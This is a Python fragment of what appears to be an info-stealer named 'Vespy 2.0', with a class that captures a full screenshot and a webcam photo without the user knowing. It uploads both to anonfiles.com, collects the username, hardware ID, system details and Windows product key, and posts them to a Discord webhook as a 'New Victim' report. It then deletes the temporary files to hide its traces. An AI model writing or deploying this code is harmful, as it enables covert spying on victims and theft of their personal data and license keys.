class Screeny:

    def __init__(self):
        jtjirjihirthr = False
        try:
            r=self.Screen()
        except:
            pass
        try:
            r2=self.W3bc4m()
        except:
            pass
        self.Info()
        if jtjirjihirthr:
            content = "@everyone New Hit"
        else:
            content = "New Hit"
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png",content=content)
        try:
            t=requests.get(r2)
            if t.status_code == 200 or t.status_code == 204:
                embed = DiscordEmbed(title=f"New Victim | CLICK FOR WEBCAM PIC", description=f"New victim | User Information",url=r2, color='4300d1')
            else:
                embed = DiscordEmbed(title=f"New Victim | NO WEBCAM PIC", description=f"New victim | User Information", color='4300d1')
        except:
            embed = DiscordEmbed(title=f"New Victim | NO WEBCAM PIC", description=f"New victim | User Information", color='4300d1')
        embed.set_author(name="author : vesper",icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        try:
            t=requests.get(r)
            if t.status_code == 200 or t.status_code == 204:
                embed.set_image(url=r)
        except:
            pass
        embed.add_embed_field(name=f":desktop: Logged : ``{self.user}``", value=f"\n:fax: Machine : ``{self.machine}``\n:gear: System : ``{self.system}``\n:control_knobs: Processor : ``{self.processor}``\n\n\n:floppy_disk: **Virtual Memory**\n:battery: Total : ``{self.TotalM}``\n:alembic: Available : ``{self.availableM}``\n:low_battery: Used : ``{self.usedM}``\n:symbols: Pourcentage : ``{self.pourcentageM}``\n\n\n:id: HWID : ``{self.hwid}``\n:key: Windows Product Key : {self.windowspk}")
        webhook.add_embed(embed)
        webhook.execute()
        try:
            os.remove(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\testy.jpg")
        except:
            pass
        try:
            os.remove(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\webby.jpg")
        except:
            pass
    
    def W3bc4m(self):
        try:
            camera = cv2.VideoCapture(0)
            return_true ,image = camera.read()
            cv2.imwrite(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\webby.jpg", image)
            file = requests.post('https://api.anonfiles.com/upload',files={'file':open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\webby.jpg","rb")})
            link = file.json()['data']['file']['url']['full']
            del(camera)
            return str(requests.get(link).content).split('<a id="download-preview-image-url" href="')[1].split('"')[0]
        except:
            return ""

    def Screen(self):
        s = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
        s.save(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\testy.jpg")
        s.close()
        while True:
            try:
                file = requests.post('https://api.anonfiles.com/upload',files={'file':open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\testy.jpg","rb")})
                break
            except:
                sleep(2)
        link = file.json()['data']['file']['url']['full']
        r=str(requests.get(link).content).split('<a id="download-preview-image-url" href="')[1].split('"')[0]
        return r
    
    def Size(self,b):
        for unit in ["", "K", "M", "G", "T", "P"]:
            if b < 1024:
                return f"{b:.2f}{unit}B"
            b /= 1024

    def Info(self):
        self.user = user
        self.machine = platform.machine()
        self.system = platform.system()
        self.processor = platform.processor()
        self.sv = psutil.virtual_memory()
        self.TotalM = self.Size(self.sv.total)
        self.availableM = self.Size(self.sv.available)
        self.usedM = self.Size(self.sv.used)
        self.pourcentageM = self.Size(self.sv.percent)+"%"
        self.hwid = str(subprocess.check_output('wmic csproduct get uuid')).replace(" ","").split("\\n")[1].split("\\r")[0]
        try:
            self.windowspk = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode(encoding="utf-8", errors="strict").split("OA3xOriginalProductKey")[1].split(" ")
            for i in self.windowspk:
                if len(i) > 20:self.windowspk = i.split(" ")
            self.windowspk = f"``{self.windowspk[0][3:]}``"
        except:
            self.windowspk = ":x:"